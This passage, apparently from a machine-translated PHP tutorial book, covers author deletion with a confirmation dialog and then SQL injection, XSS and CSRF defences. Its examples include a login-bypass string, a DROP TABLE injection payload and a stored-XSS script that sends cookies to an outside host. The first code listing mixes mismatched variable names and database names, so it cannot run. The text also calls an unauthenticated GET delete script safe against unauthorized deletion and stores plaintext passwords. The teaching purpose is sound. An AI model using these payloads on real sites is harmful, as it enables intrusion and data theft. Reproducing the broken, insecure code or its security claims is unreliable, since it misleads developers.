  UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\
  >\n    <title>List of Authors</title>\n    <link rel=\"stylesheet\" href=\"style_tab.css\"\
  >\n</head>\n<body>\n    <h2>List of Authors</h2>\n\n    <?php\n    // Database connection\n\
  \    $connexion = new PDO(\"mysql:host=localhost;dbname=bibliotheque\", \"root\"\
  , \"\");\n    $connexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \n    // Prepare selection query\n    $query = $connection->prepare(\"SELECT * FROM\
  \ authors\");\n\n    // Execute query\n    $requete->execute();\n\n    // Retrieve\
  \ results\n    $authors = $requete->fetchAll(PDO::FETCH_ASSOC);\n\n    // Display\
  \ results in HTML table\n    if (count($authors) > 0) {\n        echo \"<table>\"\
  ;\n        echo \"<tr>\n            <th>ID</th>\n            <th>Name</th>\n   \
  \         <th>First name</th>\n            <th>Email</th>\n            <th>Biography</th>\n\
  \            <th>Edit</th>\n            <th>Delete</th>\n        </tr>\";\n\n  \
  \      foreach ($authors as $author) {\n            echo \"<tr>\";\n           \
  \ echo \"<td>{$author['author_id']}</td>\";\n            echo \"<td>{$author['name']}</td>\"\
  ;\n            echo \"<td>{$author['firstname']}</td>\";\n            echo \"<td>{$author['email']}</td>\"\
  ;\n            echo \"<td>{$author['biography']}</td>\";\n            echo \"<td>\n\
  \                <a href='form_modifier_auteur.php?id_auteur={$auteur['id_auteur']}'>\n\
  \                    Edit\n                </a></td>\";\n            echo \"<td>\n\
  \                <a href='supprimer_auteur.php?id_auteur={$auteur['id_auteur']}'>\n\
  \                    Delete\n                </a></td>\";\n            echo \"</tr>\"\
  ;\n        }\n        echo \"</table>\";\n    } else {\n        echo \"No author\
  \ found.\";\n    }\n    ?>\n</body>\n</html>\n```\n\n在 `display_authors.php` 脚本中，已向作者表添加新的“Delete”列。该列由以下代码定义的“Delete”表头标识：\n\
  \n```html\n<th>Delete</th>\n```\n\n该列中的每一行都包含一个指向 `delete_author.php` 文件的链接，并带有删除操作参数。\n\
  \n```php\necho \"<td>\n    <a href='delete_author.php?author_id={$author['author_id']}'>\n\
  \        Delete\n    </a>\n</td>\";\n```\n\n此修改为用户提供了额外功能，可直接从表格显示的列表中删除特定作者。访问\
  \ `display_authors.php` 脚本时，将获得类似下图所示的结果：\n\n![Image](img/image-160.png)\n\n随后，我们在\
  \ `library` 项目根目录下创建了一个名为 `delete_author.php` 的新空文件。如果您此时点击“Delete”列中的第一个链接，将进入一个空白页面，因为\
  \ `delete_author.php` 文件仍为空。但请注意 URL 中通过 `author_id` 参数传递的作者 ID。\n\n![Image](img/image-161.png)\n\
  \n以下代码实现了删除 URL 中传递标识符对应的作者的功能：\n\n```php\n<?php\n// Check if the ID of the author\
  \ to be deleted is present in the URL\nif (isset($_GET['author_id'])) {\n    //\
  \ Retrieve author ID from URL\n    $author_id = $_GET['author_id'];\n\n    // Connect\
  \ to database\n    $connection = new PDO(\"mysql:host=localhost;dbname=library\"\
  , \"root\", \"\");\n    $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\
  \n    // Prepare deletion request\n    $request = $connection->prepare(\"DELETE\
  \ FROM authors WHERE author_id = :author_id\");\n\n    // Bind parameters\n    $request->bindParam(':author_id',\
  \ $author_id);\n\n    // Execute query\n    $result = $request->execute();\n\n \
  \   // Verify successful deletion\n    if ($result) {\n        echo \"The author\
  \ has been successfully deleted.\";\n    } else {\n        echo \"An error occurred\
  \ during deletion\";\n    }\n} else {\n    echo \"No author ID specified for deletion\"\
  ;\n}\n?>\n```\n\n此 PHP 代码执行以下操作：\n\n*   使用 `isset($_GET['author_id'])` 条件检查 URL\
  \ 中是否存在要删除的作者 ID。这确保在继续删除之前已正确传输作者 ID。\n*   如果 URL 中存在作者 ID，则从超全局变量 `$_GET['author_id']`\
  \ 中检索它。\n*   使用 PDO 建立数据库连接，并使用适当的凭据。\n*   准备一条删除请求，以从 `authors` 表中删除作者，其中作者 ID\
  \ 对应于 URL 中传递的 ID。\n*   使用 `bindParam()` 方法将查询参数绑定到作者 ID。\n*   使用 `execute()` 方法执行查询。\n\
  *   根据删除结果，向用户显示相应消息，指示操作是否成功或是否发生错误。\n\n此脚本确保仅使用有效的作者 ID 进行删除，从而避免数据库中发生任何未经授权或意外的删除。\n\
  \n当您点击任意“Delete”链接时，将收到消息“The author has been successfully deleted.” 如果您检查数据库，将发现相应作者确实已从\
  \ `authors` 表中删除。\n\n点击“Delete”链接后，如果一切顺利，将显示消息“The author has been successfully\
  \ deleted.” 此外，如果您检查作者表，会注意到相应作者确实已被删除。\n\n![Image](img/image-162.png)\n\n#####\
  \ 删除确认\n\n从数据库中删除数据有时会产生重大后果。因此，在执行删除操作之前实施确认机制至关重要，以避免意外或不必要的删除。在执行最终删除前，务必请求确认。\n\
  \n为了在永久删除作者前增加删除确认步骤，可以使用 JavaScript 对话框请求用户确认其操作。\n\n在 `display_authors.php` 文件中，修改删除链接以调用显示确认对话框的\
  \ JavaScript 函数：\n\n```php\necho \"<td>\n    <a href='delete_author.php?author_id={$author['author_id']}'\
  \ onclick='return confirmDelete()'>\n        Delete\n    </a></td>\";\n```\n\n在显示所有作者的表格的删除链接中，我们集成了值为\
  \ `'return confirmDelete()'` 的 `onclick` 属性。当用户点击关联元素时，这会触发对 JavaScript 函数 `confirmDeletion()`\
  \ 的调用。`return` 关键字用于传递该函数的返回值。在此上下文中，我们将创建一个名为 `confirmDelete()` 的新 JavaScript 函数。该函数向用户显示确认对话框，邀请他们确认是否真要执行关联操作（如删除元素）。如果用户确认，函数返回\
  \ `true`，允许点击事件正常进行并执行预期操作。反之，如果用户取消确认，函数返回 `false`，从而取消点击操作并阻止任何进一步动作。值得注意的是，本书不专注于\
  \ JavaScript，因此我们不会详细介绍这些概念。\n\n接下来，在 `display_authors.php` 文件的 `<head>` 标签之间的 `<script>`\
  \ 标签中创建名为 `confirmDelete()` 的 JavaScript 函数。\n\n```html\n<script>\nfunction confirmDelete()\
  \ {\n    return confirm(\"Do you really want to delete this author?\");\n}\n</script>\n\
  ```\n\n从现在起，当您点击作者删除链接之一时，将出现确认框，如下图所示：\n\n![Image](img/image-163.png)\n\n#### 结论\n\
  \n在本章中，我们深入探讨了数据库内数据管理的关键方面，重点关注更新和删除流程。通过理解这些基本操作，您现在拥有了维护数据完整性和相关性的强大工具。\n\n\n\
  \n\n\n### 更新和删除数据\n\n更新数据对于保持信息的最新和准确至关重要。得益于我们探索的技术，例如使用安全的 SQL 查询和参数绑定，您可以有信心地修改现有数据，将错误或漏洞的风险降至最低。\n\
  \n另一方面，数据删除是一项微妙的任务，需要审慎的方法。我们强调了在执行删除操作前进行确认的重要性，这是避免不可逆错误和防止宝贵数据丢失的关键做法。通过实施这一确认步骤，您可以加强应用程序的安全性，防止意外删除。\n\
  \n通过将对数据操作基本原理的透彻理解与安全开发实践相结合，您可以保证应用程序的健壮性和可靠性。通过使用本章介绍的技术和最佳实践，您将能够很好地有效管理项目数据，确保其在整个生命周期中的完整性和安全性。\n\
  \n### D 部分：WEB 应用程序安全\n\n在 Web 开发的广阔天地中，如果有一个所有开发者都认同的恒定真理，那就是安全的至高重要性。本书的“Web 应用程序安全”部分是任何\
  \ PHP 开发者构建不仅功能完善，而且能在面对网络空间日益增长的威胁时保持韧性的应用程序的必备路线图。\n\n互联网是一个动态的生态系统，新的 Web 应用程序不断被创建出来，随之而来的还有新的漏洞。网络攻击变得越来越复杂，后果可能是灾难性的，从个人数据泄露到关键服务瘫痪。因此，作为这些数字空间的创造者和守护者，我们有责任以安全为基石来设计它们。\n\
  \n在本部分中，我们将探讨最常见攻击的机制以及应对它们的策略。我们将研究针对服务端攻击的防御，因为数据和系统在那里最脆弱。我们将讨论防止 SQL 注入、防范 XSS\
  \ 和 CSRF 等内容，以及更多主题。\n\n但安全不仅仅是防止攻击。它还关乎采取全面的、分层的风险管理方法。因此，我们还将涵盖最佳实践，从最小权限原则到错误和日志管理、加密和安全通信。本部分将为您提供所需的工具，以便长期测试、审计和维护应用程序的安全性。\n\
  \n应对 Web 应用程序安全可能看起来令人望而生畏，但这是一个令人兴奋且必要的挑战。凭借您将在此获得的知识，您将准备好正面迎接这一挑战，并确保您的应用程序像它们应得的那样安全。准备好将您对安全的理解转化为真正的实践技能吧。\n\
  \n### 第 13 章：PHP 安全——攻击预防与风险管理\n\n本章至关重要，因为它涉及针对 Web 应用程序核心——服务器的直接攻击防御。服务端安全是 Web\
  \ 开发中最关键的方面之一，因为服务器存储着敏感数据并控制着应用程序的业务逻辑。\n\n服务端攻击可以采取多种形式，从操纵数据库的 SQL 注入，到将您的网站变成攻击用户工具的\
  \ XSS 攻击。如果不采取足够的安全措施，攻击者可能会破坏应用程序的完整性、窃取数据，甚至完全控制您的系统。\n\n在本章中，我们将探讨每位 PHP 开发者都需要掌握的关键概念和防御技术。我们将剖析最常见的攻击方法，理解其机制，最重要的是，学习如何应对它们。我们将深入探讨\
  \ SQL 注入的技术细节，探究 XSS 攻击的微妙之处，并揭开 CSRF 的神秘面纱。\n\n保护 Web 应用程序是一项复杂的任务，需要透彻了解潜在威胁并时刻关注细节。在本章结束时，您将掌握所需的知识和工具，为您的服务器构建一座堡垒，确保应用程序保持安全可靠。\n\
  \n准备好加强您的防御，并将服务端安全作为您 PHP 开发中的首要任务吧。\n\n#### SQL 注入攻击\n\nSQL 注入攻击是对 Web 应用程序安全最常见、最危险的威胁之一。它们通过将恶意\
  \ SQL 代码注入未经过滤或未经验证的用户输入中，利用数据库管理系统（DBMS）中的安全漏洞。\n\n这种攻击形式使攻击者能够执行未经授权且可能具有破坏性的\
  \ SQL 命令，例如删除数据、修改内容，甚至从数据库中提取机密信息。后果可能是灾难性的，从数据丢失到应用程序完全沦陷。\n\n在本节中，我们将详细探讨 SQL\
  \ 注入攻击的基础知识，重点关注攻击者使用的技术、对数据安全的潜在风险，以及预防和缓解这些攻击的最佳实践。通过理解这些攻击的底层机制并实施适当的安全措施，开发者可以增强其\
  \ Web 应用程序抵御这一普遍威胁的能力。\n\n假设我们已经在 Web 应用程序“library”中实现了一个认证系统，正如上一节所述。在我们的“library”数据库中，有一个名为\
  \ `authors` 的表，包含姓名、名字、电子邮件地址、密码等信息。然而，重要的是要注意，在实践中，我们可能还拥有更敏感的信息，例如支付详情。假设我们的应用程序提供了一个登录表单，包含一个\
  \ `Email` 字段和一个 `Password` 字段。如果输入的电子邮件地址和密码存在于 `authors` 表中，则相应用户将通过认证并可以访问机密数据。\n\
  \n下面是该表单的代码示例，保存在名为 `form_connection.php` 的文件中：\n\n```html\n<!DOCTYPE html>\n<html>\n\
  \ <head>\n <title>Connection</title>\n </head>\n <body>\n <form action=\"connexion.php\"\
  \ method=\"post\">\n <label for=\"email\">Email:</label>\n <input type=\"text\"\
  \ id=\"email\" name=\"email\"><br><br>\n\n <label for=\"password\">Password:</label>\n\
  \ <input type=\"password\" id=\"password\" name=\"password\"><br>\n <button type=\"\
  submit\">Log in</button>\n </form>\n </body>\n</html>\n```\n\n下面是处理连接请求的 `connection.php`\
  \ 文件中的代码示例：\n\n```php\n<?php\n // Database connection\n$connection = new PDO(\"\
  mysql:host=localhost;dbname=library\", \"root\",\"\");\n\n// Retrieve user data\n\
  $email = $_POST['email'];\n$password = $_POST['password'];\n\n// Vulnerable SQL\
  \ query (direct)\n$sql = \"SELECT * FROM authors WHERE email = '$email' AND password\
  \ = '$password'\";\n\n// Execute query\n$result = $connection->query($sql);\n\n\
  // Check results\nif ($result !== false && $result->rowCount() > 0) {\n echo \"\
  Login successful!\";\n} else {\n echo \"Login failed.\";\n}\n?>\n```\n\n如果您输入存储在\
  \ `authors` 表中的电子邮件地址和密码，您将收到“Login successful!”消息；但是，如果不存在，您将看到“Login failed.”\n\
  \n到目前为止，一切似乎都很正常，但如果网站没有像前面的代码那样妥善防范 SQL 注入，攻击者可以在登录表单的两个字段中输入恶意电子邮件地址和恶意密码。例如，攻击者可以不输入有效的电子邮件地址和密码，而是输入：\n\
  \nemail: `' OR '1'='1`\npassword: `' OR '1'='1`\n\n![Image](img/image-164.png)\n\
  \n这样，即使他们没有提供有效的电子邮件地址和密码，仍然可以登录。\n\n\n\n\n\n在这种情况下，上述代码生成的 SQL 查询将变为：\n\n```sql\n\
  SELECT * FROM authors WHERE \nemail = '' OR '1'='1' \nAND \npassword = '' OR '1'='1';\n\
  ```\n\n在这种情况下，条件 `'1'='1'` 始终为真，这意味着查询将返回 `authors` 表中的所有行，从而允许攻击者访问数据库中存储的所有信息，包括敏感的用户数据。\n\
  \n此示例说明了简单的 SQL 注入漏洞如何危害网站安全，并允许攻击者访问机密数据。这就是为什么实施强有力的防护措施以防止此类攻击至关重要。\n\n此外，如果恶意攻击者决定从您的数据库中删除整个表，SQL\
  \ 注入可能会造成不可逆的损害。例如，如果攻击者输入如下电子邮件地址：\n\n```sql\n'; DROP TABLE authors; DROP TABLE\
  \ books; --\n```\n\n而在“密码”字段中，他可以输入任何内容：\n\n![Image](img/image-165.png)\n\n在这种情况下，SQL\
  \ 查询将变为：\n\n```php\n$sql = \"SELECT * FROM authors WHERE email = ''; DROP TABLE\
  \ authors; DROP TABLE books; --' AND password = 'password'\";\n```\n\n在这个恶意查询中，攻击者利用\
  \ SQL 注入技术连续执行多条 SQL 语句。在输入一个以单引号 (`'`) 结尾的恶意电子邮件地址来终止 `SELECT` 查询的字符串后，攻击者利用 `DROP\
  \ TABLE` 语句删除 \"authors\" 表，随后又用 `DROP TABLE` 删除 \"books\" 表。最后，攻击者使用 `--` 注释掉查询的其余部分，以避免任何\
  \ SQL 错误并确保 `DROP TABLE` 语句得以执行。“密码”字段可以是任何值，因为它将被忽略。\n\n如果您通过点击“登录”按钮提交此表单，“authors”表和“books”表都将从数据库中被不可逆地删除。\n\
  \n设想一下，如果您的数据库包含更敏感的数据，例如财务信息、机密医疗数据或详细个人信息，损害将有多大。在这种情况下，成功的 SQL 注入不仅会危及这些数据的机密性和完整性，还可能给您的组织带来严重的法律后果。\n\
  \n确实，此类数据的丢失或未经授权的披露不仅会损害公司声誉，还可能使您面临诉讼、罚款和其他监管制裁。此外，恢复丢失或损坏的数据可能极其昂贵且耗时，且无法保证完全成功。\n\
  \n因此，采取主动措施保护 Web 应用程序免受 SQL 注入攻击和其他安全威胁至关重要。这不仅意味着采用安全开发最佳实践，还意味着实施监控和入侵检测机制，以检测并快速响应任何可疑活动。\n\
  \n#### 如何预防和修复 SQL 注入漏洞？\n\n要解决先前提供的代码中存在的 SQL 注入漏洞，您需要使用带有绑定参数的预处理语句。以下是修复代码的方法：\n\
  \n```php\n<?php  \n\n// 数据库连接  \n$connection = new PDO(\"mysql:host=localhost;dbname=library\"\
  , \"root\", \"\");  \n\n// 检索用户数据  \n$email = $_POST['email'];  \n$password = $_POST['password'];\
  \  \n\n// 使用绑定参数的安全 SQL 查询  \n$sql = \"SELECT * FROM authors WHERE email = :email\
  \ AND password = :password\";  \n$request = $connection->prepare($sql);  \n$request->bindParam(':email',\
  \ $email);  \n$request->bindParam(':password', $password);  \n\n// 执行请求  \n$request->execute();\
  \  \n\n// 检查结果  \nif ($request->rowCount() > 0) {  \n    echo \"Connection successful!\"\
  ;  \n} else {  \n    echo \"Login failed.\";  \n}  \n\n?>\n```\n\n采用这种方法，`$email`\
  \ 和 `$password` 变量的值作为绑定参数传递给预处理查询。这可以防止 SQL 注入攻击，因为参数值不会被解释为 SQL 代码。此外，它还通过防止恶意用户更改\
  \ SQL 查询结构来保证增强的安全性。\n\n#### 跨站脚本攻击 (XSS) 简介\n\n跨站脚本攻击 (XSS) 是一种常见的漏洞，允许攻击者将恶意代码（通常是\
  \ JavaScript）注入到其他用户查看的网页中。当用户提供的数据未经过适当验证或转义时，就会发生这种攻击，这使得攻击者能够在另一个用户的浏览器上执行代码，从而危害应用程序的安全性。\n\
  \nXSS 主要有三种类型：反射型 XSS、存储型 XSS 和基于 DOM 的 XSS。在接下来的部分中，我们将详细了解前两种类型。\n\n##### 反射型\
  \ XSS\n\n在这种攻击类型中，恶意代码包含在 HTTP 请求中，随后由 Web 服务器在 HTML 响应中反射回去。攻击者随后可以将包含恶意代码的链接发送给受害者，受害者在点击链接时会无意中执行它。\n\
  \n想象一个带有搜索表单的网站，该表单直接在页面上显示搜索结果。如果网站没有正确转义特殊字符，攻击者就可以将恶意 JavaScript 代码插入搜索字段。\n\n\
  为了演示第一种类型的 XSS，在 `ebookphp` 目录中，让我们创建一个名为 `form_search.php` 的新文件，其中放置一个简单的搜索表单：\n\
  \n```html\n<!DOCTYPE html>  \n<html lang=\"en\">  \n<head>  \n    <meta charset=\"\
  UTF-8\"> \n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\
  >  \n    <title>Search Form</title>  \n</head>  \n<body>  \n    <h2>Search</h2>\
  \  \n    <form action=\"search.php\" method=\"POST\">  \n        <label for=\"search\"\
  >Search:</label>  \n        <input type=\"text\" id=\"search\" name=\"query\"> \
  \ \n        <button type=\"submit\">Search</button>  \n    </form>  \n</body>  \n\
  </html>\n```\n\n结果：\n\n![Image](img/image-166.png)\n\n接下来，我们创建另一个文件 `search.php`，用于处理表单的处理逻辑：\n\
  \n```html\n<!DOCTYPE html>  \n<html lang=\"en\">  \n<head>  \n    <meta charset=\"\
  UTF-8\"> \n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\
  >  \n    <title>Research results</title>  \n</head>  \n<body>  \n    <h2>Search\
  \ results</h2>  \n    <?php  \n    // 检索表单中输入的搜索词  \n    $query = $_POST['query'];\
  \  \n    // 显示结果  \n    echo \"<p>Results for search: <strong>$query</strong></p>\"\
  ;  \n    ?>  \n</body>  \n</html>\n```\n\n当您通过执行 `form_search.php` 文件使用搜索表单，并在搜索字段中输入例如\
  \ \"Maximilien Lambert\" 后提交表单时，您将获得类似如下的结果：\n\n![Image](img/image-167.png)\n\n\
  但是，如果用户输入 JavaScript 代码，例如 `<script>alert('XSS reflected!')</script>`，而网站在将搜索数据显示在页面上之前没有执行适当的验证或转义，恶意\
  \ JavaScript 脚本将在用户执行搜索时在其浏览器中执行，显示一个包含消息 \"XSS reflected!\" 的对话框。\n\n![Image](img/image-168.png)\n\
  \n为了修复此示例中的 XSS 漏洞，我们需要在将输入数据显示在结果页面之前对其进行清理。具体方法如下：\n\n**输入数据清理：** 在结果页面中使用 `$query`\
  \ 变量之前，我们需要通过移除任何潜在的恶意 HTML 或 JavaScript 代码来清理数据。我们可以通过使用 `htmlspecialchars()` 函数对特殊字符进行编码来实现这一点。\n\
  \n以下是修复 XSS 漏洞的修改后代码：\n\n```html\n<!DOCTYPE html>  \n<html lang=\"en\">  \n<head>\
  \  \n    <meta charset=\"UTF-8\"> \n    <meta name=\"viewport\" content=\"width=device-width,\
  \ initial-scale=1.0\">  \n    <title>Research results</title>  \n</head>  \n<body>\
  \  \n    <h2>Search results</h2>  \n    <?php  \n    // 检索表单中输入的搜索词  \n    $query\
  \ = htmlspecialchars($_POST['query']);  \n    // 显示结果  \n    echo \"<p>Results for\
  \ search: <strong>$query</strong></p>\";  \n    ?>  \n</body>  \n</html>\n```\n\n\
  \n\n通过应用此修改，用户输入的搜索词将在结果页面显示前得到适当的清理，通过防止恶意脚本在用户浏览器中执行，从而防范 XSS 攻击。\n\n实际上，`htmlspecialchars()`\
  \ 是一个 PHP 函数，用于将某些特殊字符转换为等效的 HTML 实体。它将 `<`、`>`、`&`、`\"` 和 `'` 等字符替换为其 HTML 等效项（`&lt;`、`&gt;`、`&amp;`、`&quot;`、`&#39;`）。这意味着如果用户输入类似\
  \ `<script>alert('XSS!');</script>` 的内容，`htmlspecialchars` 函数会将 `<` 和 `>` 标签转换为\
  \ HTML 实体（`&lt;` 和 `&gt;`），从而防止脚本标签在浏览器中执行。\n\n#### XSS Stored（存储型/持久型）\n\n存储型 XSS，也称为持久型\
  \ XSS，危害性更大，因为恶意脚本存储在服务器上（例如数据库中），随后会显示给访问受影响页面的每一位用户。当 Web 应用程序存储了不安全的用户提供的数据，然后在未经适当转义或过滤的情况下将其显示在网页上时，就会发生存储型\
  \ XSS。这允许攻击者将恶意代码（如 JavaScript 脚本）注入网页，从而危害访问该页面的用户的安全。\n\n##### 存储型 XSS 攻击示例\n\n\
  设想一个在线论坛，用户可以在不同主题下发布评论。网站将这些评论存储在数据库中，然后在相应页面上显示它们。如果 Web 应用程序在显示评论前未执行适当的验证或转义，攻击者就可能提交包含恶意\
  \ JavaScript 代码的评论。\n\n例如，攻击者可能提交包含以下代码的评论：\n\n```\n<script>\n  fetch('https://www.example.com/my_cookies.php?cookie='\
  \ + document.cookie);\n</script>\n```\n\n当该评论在网页上显示时，恶意 JavaScript 代码会在每位查看该页面的用户的浏览器中执行。在本例中，JavaScript\
  \ 代码将用户的 Cookie 发送到攻击者控制的网站，从而泄露用户信息的机密性。\n\n##### 存储型 XSS 防范\n\n要防范 `stored XSS`\
  \ 攻击，实施适当的安全实践至关重要，其中包括：表单输入验证和输出转义：\n\n###### 输入验证\n\n在将用户提供的数据存入数据库前，始终对其进行验证和过滤。这可能包括检查预期的数据格式（例如电子邮件地址），以及使用白名单仅允许特定值。\n\
  \n假设我们在网站上有一个注册表单，用户可以提交评论。为了验证用户输入，我们可以使用 PHP 内置验证函数（如 `filter_var()`）来检查电子邮件地址格式是否正确。\n\
  \n####### PHP 邮箱验证示例\n\n```\n$email = $_POST['email'];\n\n// 验证邮箱地址\nif (!filter_var($email,\
  \ FILTER_VALIDATE_EMAIL)) {\n    echo \"Invalid email address\";\n    // 处理错误或阻止记录保存\n\
  } else {\n    // 将邮箱地址保存到数据库\n}\n```\n\n###### 输出转义\n\n在将动态数据插入 HTML 页面前，对其进行适当转义。这意味着将所有特殊字符转换为\
  \ HTML 实体，以便浏览器将其视为纯文本，而非 HTML 或 JavaScript 代码。\n\n在我们的评论表单示例中，在网页上显示评论前，我们需要转义\
  \ `<`、`>`、`&`、`\"` 等特殊字符，以防止恶意脚本执行。\n\n如果运行以下代码，将显示一个包含文本 \"XSS!\" 的 JavaScript\
  \ 窗口：\n\n```\n$comment = \"<script>alert('XSS!');</script>\";\necho \"<div>$comment</div>\"\
  ;\n```\n\n在 PHP 中，要转义 `$comment` 变量的内容，只需按如下方式使用 `htmlspecialchars()` 函数：\n\n```\n\
  $comment = \"<script>alert('XSS!');</script>\";\n// 转义特殊字符\n$comment_echappe = htmlspecialchars($comment);\n\
  // 在网页上显示转义后的评论\necho \"<div>$comment_echappe</div>\";\n```\n\n在这段代码中，`htmlspecialchars()`\
  \ 函数用于转义评论中的特殊字符，这意味着 `<`、`>`、`&`、`\"` 等特殊字符将被转换为 HTML 实体，从而在网页上显示时变得无害。最后，转义后的评论在网页的\
  \ `<div>` 标签内显示。\n\n当这段代码被执行并在网页上显示时，`<script>` 标签不会被解释为要执行的 JavaScript 代码，而是作为纯文本显示在屏幕上。因此，浏览器不会显示警报对话框，而是直接显示\
  \ `<script>alert('XSS!');</script>`，这表明 `<script>` 标签及其内容（包括对 `alert()` 函数的调用）已作为纯文本显示在网页上。这证明\
  \ `htmlspecialchars()` 函数成功转义了特殊字符，防止了 JavaScript 代码作为 XSS 攻击被执行。\n\n通过应用这些良好的安全实践，开发人员可以显著降低存储型\
  \ XSS 攻击的风险，从而保护其 Web 应用程序用户的安全和隐私。\n\n#### 跨站请求伪造 (CSRF)\n\n跨站请求伪造 (CSRF) 是一种恶意攻击，它利用已认证用户的信任，在用户不知情的情况下执行未授权操作。该攻击利用了这样一个事实：Web\
  \ 浏览器会在发送给某个站点的每个请求中自动携带认证 Cookie，即使这些请求是从另一个站点发起的。\n\n##### CSRF 攻击原理\n\nCSRF 攻击通常通过诱导已认证用户访问包含特制链接或表单的恶意站点来实施，这些链接或表单旨在对目标站点执行特定操作。当用户访问恶意站点时，由后者生成的请求会自动发送到目标站点，并携带用户的认证信息，而用户对此次攻击毫不知情。\n\
  \n##### 实施反 CSRF 令牌\n\n防范 CSRF 攻击的主要措施是使用反 CSRF 令牌，也称为同步令牌或防重放令牌。这些令牌是与每个用户和每个会话关联的唯一随机值。它们在服务器端生成，并包含在发送给用户的表单或\
  \ POST 请求中。提交请求时，服务器会检查相应的反 CSRF 令牌对于该特定会话和操作是否有效。如果令牌无效或缺失，则拒绝该请求。\n\n##### 反 CSRF\
  \ 令牌实现示例\n\n下面是一个在 PHP 中生成和验证反 CSRF 令牌的简单示例：\n\n```\n<?php\n\nsession_start();\n\
  // 生成反 CSRF 令牌\nif (!isset($_SESSION['csrf_token'])) {\n    $_SESSION['csrf_token']\
  \ = bin2hex(random_bytes(32));\n}\n\n// 在表单中包含反 CSRF 令牌\necho '<form action=\"csrf_processing.php\"\
  \ method=\"post\">';\necho '<input type=\"hidden\" name=\"csrf_token\" value=\"\
  ' . $_SESSION['csrf_token'] . '\">';\necho '<input type=\"submit\" value=\"Submit\"\
  >';\necho '</form>';\n\n// 服务端验证反 CSRF 令牌\nif (isset($_POST['csrf_token']) && $_POST['csrf_token']\
  \ === $_SESSION['csrf_token']) {\n    // 处理请求\n    echo \"Request processed successfully\"\
  ;\n} else {\n    // 拒绝请求\n    echo \"Error: invalid CSRF request.\";\n}\n\n?>\n\
  ```\n\n这段 PHP 代码演示了如何使用反 CSRF 令牌来防止 Web 表单上的 CSRF 攻击。以下是代码各部分的详细解释：\n\n**`session_start()`：**\
  \ 此函数启动一个新会话或恢复现有会话。会话用于存储会话变量（如反 CSRF 令牌），这些变量可通过不同页面访问。\n\n\n\n\n### 反 CSRF 令牌生成\n\
  \n代码检查会话中是否已存在反 CSRF 令牌。如果不存在，则使用 `random_bytes()` 函数创建一个 32 字节的随机字符串，再通过 `bin2hex()`\
  \ 将其转换为十六进制表示，从而生成一个新令牌。\n\n#### 在表单中包含反 CSRF 令牌\n\n随后，反 CSRF 令牌作为隐藏字段（`<input type=\"\
  hidden\">`）包含在 HTML 表单中。这确保了当表单提交到服务器时，令牌会随表单数据的其余部分一同提交。\n\n#### 服务端反 CSRF 令牌验证\n\
  \n表单提交时，反 CSRF 令牌也会随表单数据一同提交。代码检查提交的令牌是否与会话中存储的令牌匹配。如果两个令牌匹配，则请求合法，可成功处理。否则，将显示无效\
  \ CSRF 错误。\n\n这种反 CSRF 令牌机制确保了从表单提交的每个请求都包含唯一且有效的令牌，通过验证请求确实来自授权网站来防止 CSRF 攻击。\n\
  \n##### 实现示例\n\n为了演示 PHP 中反 CSRF 令牌的生成与验证，我们将在 `ebookphp` 目录下创建两个文件：包含表单的 `form_csrf.php`\
  \ 文件，以及处理该表单提交数据的 `csrf_processing.php` 文件。以下是这两个文件的简单代码示例：\n\n##### 文件 1：`form_csrf.php`\n\
  \n```php\n<?php\n\nsession_start();\n\n// 生成反 CSRF 令牌\nif (!isset($_SESSION['csrf_token']))\
  \ {\n    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));\n}\n\n// 显示包含反 CSRF\
  \ 令牌的表单\necho '<form action=\"csrf_processing.php\" method=\"post\">';\necho '<input\
  \ type=\"text\" name=\"name\" placeholder=\"Name\">';\necho '<input type=\"hidden\"\
  \ name=\"csrf_token\" value=\"' . $_SESSION['csrf_token'] . '\">';\necho '<input\
  \ type=\"submit\" value=\"Submit\">';\necho '</form>';\n\n?>\n```\n\n**结果：**\n\n\
  ![Image](img/image-169.png)\n\n此 PHP 代码生成一个反 CSRF 令牌，并显示一个包含该令牌的 HTML 表单。以下是逐行解释：\n\
  \n*   `session_start();`：启动或恢复现有会话。\n*   `if (!isset($_SESSION['csrf_token'])) {\
  \ ... }`：检查 `csrf_token` 键是否已存在于会话中。如果不存在，则生成一个反 CSRF 令牌。\n*   `$_SESSION['csrf_token']\
  \ = bin2hex(random_bytes(32));`：使用 `random_bytes(32)` 函数获取 32 字节随机数据，再通过 `bin2hex()`\
  \ 函数将这些字节转换为十六进制字符串，从而生成随机反 CSRF 令牌。\n*   `echo '<form action=\"csrf_processing.php\"\
  \ method=\"post\">';`：开始 HTML 表单标签，action 指向文件 `csrf_processing.php`，方法为 POST。\n\
  *   `echo '<input type=\"text\" name=\"lastname\" placeholder=\"Lastname\">';`：显示一个用于输入姓名的文本输入字段。\n\
  *   `echo '<input type=\"hidden\" name=\"csrf_token\" value=\"' . $_SESSION['csrf_token']\
  \ . '\">';`：显示反 CSRF 令牌的隐藏字段，其值为存储在会话中的令牌。\n*   `echo '<input type=\"submit\" value=\"\
  Submit\">';`：显示一个提交按钮以发送表单。\n\n简而言之，此代码生成一个包含反 CSRF 令牌的表单，以在表单提交时防范 CSRF 攻击。\n\n\
  ##### 文件 2：`csrf_processing.php`\n\n```php\n<?php\n\nsession_start();\n\n// 反 CSRF\
  \ 令牌验证\nif (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token'])\
  \ {\n    // 令牌有效时处理请求\n    echo \"Request processed successfully\";\n} else {\n\
  \    // 令牌无效时拒绝请求\n    echo \"Error: invalid CSRF request.\";\n}\n\n?>\n```\n\n\
  此 PHP 代码验证随 `form_csrf.php` 表单提交的反 CSRF 令牌。以下是逐行解释：\n\n*   `session_start();`：启动或恢复现有会话。\n\
  *   `if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token'])\
  \ { ... }`：检查随表单提交的反 CSRF 令牌（`$_POST['csrf_token']`）是否与存储在会话中的令牌（`$_SESSION['csrf_token']`）匹配。如果两个令牌匹配，则请求有效，可进行处理。\n\
  *   `echo \"Request processed successfully.\";`：如果令牌有效，显示请求已成功处理的消息。\n*   `else\
  \ { ... }`：否则，如果令牌不匹配，则该请求可能是 CSRF 攻击，予以拒绝。\n*   `echo \"Error: invalid CSRF request.\"\
